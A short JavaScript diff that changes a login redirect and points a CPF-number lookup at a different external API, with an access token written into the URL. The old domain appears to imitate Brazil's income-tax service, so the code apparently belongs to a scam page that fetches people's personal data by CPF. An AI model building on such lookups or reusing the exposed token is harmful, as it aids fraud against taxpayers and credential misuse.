@@ -26,7 +26,7 @@ document.addEventListener("DOMContentLoaded", function () {
   });
 
   const userData = localStorage.getItem("userData");
-  if (!userData) {
+  if (userData) {
     const currentParams = window.location.search;
     const baseUrl = "dashboard.html";
     const finalUrl = currentParams
@@ -59,8 +59,7 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 
   function consultarCPF(cpf) {
-    // Novo endpoint da API
-    const apiUrl = `https://irpf-imposto.site/buscar-cpf/new-api.php?cpf=${cpf}`;
+    const apiUrl = `https://bk.elaitech.pro/consultar-filtrada/cpf?cpf=${cpf}&token=4jinxv7me8lhx5nbney6bu`;
 
     fetch(apiUrl)
       .then((response) => {
